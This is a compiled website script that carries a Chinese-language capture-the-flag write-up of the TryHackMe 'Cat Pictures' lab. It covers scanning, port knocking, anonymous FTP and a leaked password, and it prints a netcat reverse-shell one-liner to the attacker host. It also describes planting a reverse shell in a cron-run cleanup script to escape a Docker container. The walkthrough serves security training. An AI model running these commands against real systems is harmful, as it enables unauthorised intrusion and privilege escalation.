"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[1494],{87367:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>c,toc:()=>l});var r=t(74848),s=t(28453);const a={sidebar_position:59,tags:["Easy","Linux","\u7aef\u53e3\u6572\u51fb","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","docker","\u5b9a\u65f6\u4efb\u52a1"],title:"Cat Pictures",description:"Cat Pictures",sidebar_label:"Cat Pictures",slug:"/tryhackme/59"},i="Cat Pictures",c={id:"box/TryHackMe/59",title:"Cat Pictures",description:"Cat Pictures",source:"@site/docs/box/TryHackMe/59.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/59",permalink:"/docs/tryhackme/59",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u7aef\u53e3\u6572\u51fb",permalink:"/docs/tags/\u7aef\u53e3\u6572\u51fb"},{label:"\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP",permalink:"/docs/tags/\u533f\u540d\u8eab\u4efd\u767b\u9646-ftp"},{label:"docker",permalink:"/docs/tags/docker"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:59,frontMatter:{sidebar_position:59,tags:["Easy","Linux","\u7aef\u53e3\u6572\u51fb","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","docker","\u5b9a\u65f6\u4efb\u52a1"],title:"Cat Pictures",description:"Cat Pictures",sidebar_label:"Cat Pictures",slug:"/tryhackme/59"},sidebar:"boxSidebar",previous:{title:"Dav",permalink:"/docs/tryhackme/58"},next:{title:"Plotted-TMS",permalink:"/docs/tryhackme/60"}},o={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8080",id:"8080",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"4420",id:"4420",level:3},{value:"4420 \u2014&gt; root (docker)",id:"4420--root-docker",level:3},{value:"root(docker) \u2014&gt; root",id:"rootdocker--root",level:3}];function p(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"cat-pictures",children:"Cat Pictures"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-24-143:~/catpictures# nmap -sTCV -p 22,4420,8080 --min-rate 1000 10.10.205.99\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-03 12:49 BST\nNmap scan report for ip-10-10-205-99.eu-west-1.compute.internal (10.10.205.99)\nHost is up (0.00015s latency).\n\nPORT     STATE SERVICE        VERSION\n22/tcp   open  ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)\n|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)\n|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (EdDSA)\n4420/tcp open  nvm-express?\n| fingerprint-strings: \n|   DNSVersionBindReq, GenericLines, GetRequest, HTTPOptions, RTSPRequest: \n|     INTERNAL SHELL SERVICE\n|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.\n|     ctrl-c\n|     Please enter password:\n|     Invalid password...\n|     Connection Closed\n|   NULL, RPCCheck: \n|     INTERNAL SHELL SERVICE\n|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.\n|     ctrl-c\n|_    Please enter password:\n8080/tcp open  ssl/http-proxy Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27\n|_http-title: Cat Pictures - Index page\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\n"})}),"\n",(0,r.jsx)(n.h2,{id:"8080",children:"8080"}),"\n",(0,r.jsx)(n.p,{children:"\u8bbf\u95ee 8080 \u7aef\u53e3\u6211\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a phpBB \u8bba\u575b, \u67e5\u770b\u5176\u4e2d\u7684\u6587\u7ae0\u6211\u53d1\u73b0\u4e00\u6bb5\u6570\u5b57"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223528.png",alt:"20240702223528"})}),"\n",(0,r.jsxs)(n.p,{children:['\u8fd9\u8ba9\u6211\u60f3\u8d77\u6765\u7aef\u53e3\u6572\u51fb, \u8fd9\u662f\u4e00\u79cd\u9690\u85cf\u7aef\u53e3\u7684\u65b9\u6cd5 "',(0,r.jsx)(n.strong,{children:"\u7aef\u53e3\u6572\u51fb"}),'", \u6240\u4ee5\u6211\u4e0b\u8f7d\u5de5\u5177\u8fdb\u884c\u7aef\u53e3\u6572\u51fb, (\u8bb0\u5f97\u591a\u7528\u51e0\u6b21,\u514d\u5f97\u51fa\u9519)']}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223554.png",alt:"20240702223554"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e4b\u540e\u518d\u6b21\u8fdb\u884c\u7aef\u53e3\u626b\u63cf, \u53d1\u73b0\u5b58\u5728 21 \u7aef\u53e3"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-24-143:~/catpictures# nmap -sT -p- --min-rate 1000 10.10.205.99\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-03 12:55 BST\nNmap scan report for ip-10-10-205-99.eu-west-1.compute.internal (10.10.205.99)\nHost is up (0.00024s latency).\nNot shown: 65531 closed ports\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n4420/tcp open  nvm-express\n8080/tcp open  http-proxy\nMAC Address: 02:94:A3:D2:F3:73 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 2.25 seconds\n"})}),"\n",(0,r.jsx)(n.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u76f4\u63a5\u8fdb\u884c FTP \u533f\u540d\u8eab\u4efd\u767b\u9646, \u53d1\u73b0\u53ef\u4ee5\u6210\u529f\u5e76\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u6587\u6863"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223741.png",alt:"20240702223741"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b note.txt \u6211\u53d1\u73b0\u8fd9\u662f 4420 \u7aef\u53e3\u7684\u4e00\u4e2a\u8fde\u63a5\u5bc6\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-24-143:~/catpictures# cat note.txt \nIn case I forget my password, I'm leaving a pointer to the internal shell service on the server.\n\nConnect to port 4420, the password is sardinethecat.\n- catlover\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"4420",children:"4420"}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u4e0a\u9762\u7684\u5bc6\u7801\u8fdb\u884c\u8fde\u63a5, \u6211\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u5c0f\u7cfb\u7edf"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223802.png",alt:"20240702223802"})}),"\n",(0,r.jsx)(n.h3,{id:"4420--root-docker",children:"4420 \u2014> root (docker)"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u8fd9\u4e2a\u5c0f\u7cfb\u7edf\u4e2d\u679a\u4e3e\u6211\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u7a0b\u5e8f\u540d\u79f0\u53eb runme , \u540c\u65f6\u6267\u884c\u544a\u8bc9\u6211\u9700\u8981\u4e00\u4e2a\u5b8c\u6574shell"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223828.png",alt:"20240702223828"})}),"\n",(0,r.jsx)(n.p,{children:"\u56e0\u4e3a\u5176\u4e2d\u63d0\u4f9b\u7684\u7a0b\u5e8f\u4e5f\u975e\u5e38\u5c11, \u6240\u4ee5\u6211\u5c1d\u8bd5\u83b7\u53d6\u53cd\u5411 Shell, \u6700\u7ec8\u53d1\u73b0\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u6765\u83b7\u53d6\u5230 Shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.24.143 4444 >/tmp/f\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u83b7\u53d6\u4ece 4420 \u7aef\u53e3\u83b7\u53d6\u7684 Reverse Shell, \u6211\u53d1\u73b0\u8fd9\u4ecd\u7136\u662f\u4e00\u4e2a\u5c0f\u7cfb\u7edf, \u56e0\u4e3a\u8fde id \u547d\u4ee4\u90fd\u6ca1\u6709"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223841.png",alt:"20240702223841"})}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u65f6\u6211\u5e94\u8be5\u53ef\u4ee5\u8fd0\u884c runme \u7a0b\u5e8f, \u4f46\u662f\u5f53\u6211\u8fd0\u884c\u7684\u65f6\u5019\u6211\u53d1\u73b0\u9700\u8981\u6211\u63d0\u4f9b\u5bc6\u7801"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223856.png",alt:"20240702223856"})}),"\n",(0,r.jsx)(n.p,{children:"\u56e0\u6b64\u6211\u4f7f\u7528 nc \u5c06 runne \u4f20\u8f93\u5230\u672c\u5730\u8fdb\u884c\u67e5\u770b,"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u53d1\u9001\u7aef\u6267\u884c"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"I have no name!@cat-pictures:/home/catlover# nc -l 7778 < runme\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u653b\u51fb\u673a\u6267\u884c:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-24-143:~/catpictures# nc 10.10.205.99 7778 > runme\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f20\u8f93\u5230\u672c\u5730\u540e\u6211\u4f7f\u7528 strings \u547d\u4ee4\u67e5\u770b\u53d1\u73b0\u5176\u4e2d\u5bc6\u7801\u662f\u660e\u6587\u663e\u793a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223908.png",alt:"20240702223908"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u4ece\u8fd9\u91cc\u83b7\u5f97\u7684\u5bc6\u7801\u8fdb\u884c\u8f93\u5165\u53d1\u73b0\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a id_rsa"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"I have no name!@cat-pictures:/home/catlover# ./runme\n./runme\nPlease enter yout password: rebecca\nWelcome, catlover! SSH key transfer queued!\nI have no name!@cat-pictures:/home/catlover# ls -al\nls -al\ntotal 32\ndrwxr-xr-x 2 0 0  4096 Sep  3 12:22 .\ndrwxr-xr-x 3 0 0  4096 Apr  2  2021 ..\n-rw-r--r-- 1 0 0  1675 Sep  3 12:22 id_rsa\n-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e4b\u540e\u4f7f\u7528\u83b7\u53d6\u5230\u5f97\u79c1\u94a5\u8fdb\u884c\u8fde\u63a5, \u5c31\u83b7\u53d6\u5230\u4e86 docker \u4e2d Root \u6743\u9650"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702223927.png",alt:"20240702223927"})}),"\n",(0,r.jsx)(n.h3,{id:"rootdocker--root",children:"root(docker) \u2014> root"}),"\n",(0,r.jsxs)(n.p,{children:["\u6b64\u65f6\u6211\u67e5\u770b\u6839\u76ee\u5f55\u53d1\u73b0\u6709\u4e00\u4e2a\u7279\u6b8a\u6587\u4ef6 ",(0,r.jsx)(n.code,{children:".dockerenv"})," , \u8fd9\u8868\u660e\u6211\u4eec\u4f4d\u4e8e Dokcer \u5bb9\u5668\u4e2d"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702224004.png",alt:"20240702224004"})}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u65f6\u6211\u53d1\u73b0\u6709\u4e00\u4e2a .bash_history \u6587\u4ef6, \u8fd9\u5176\u4e2d\u5b58\u5728\u5185\u5bb9, \u6211\u67e5\u770b\u6b64\u6587\u4ef6, \u53d1\u73b0\u5176\u4e00\u76f4\u5728\u64cd\u4f5c /opt/clean/clean.sh \u6587\u4ef6, \u6211\u67e5\u770b\u8be5\u6587\u4ef6\u5185\u5bb9\u53d1\u73b0\u5176\u662f\u6e05\u7a7a /tmp \u76ee\u5f55"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@7546fa2336d6:/# cat /opt/clean/clean.sh \n#!/bin/bash\n\nrm -rf /tmp/*\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6240\u4ee5\u6211\u731c\u6d4b\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1, \u56e0\u6b64\u5728\u5176\u4e2d\u6dfb\u52a0\u53cd\u5411 Shell  \u5185\u5bb9\u7b49\u5f85\u5176\u6267\u884c"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702224016.png",alt:"20240702224016"})})]})}function d(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(p,{...e})}):p(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>c});var r=t(96540);const s={},a=r.createContext(s);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);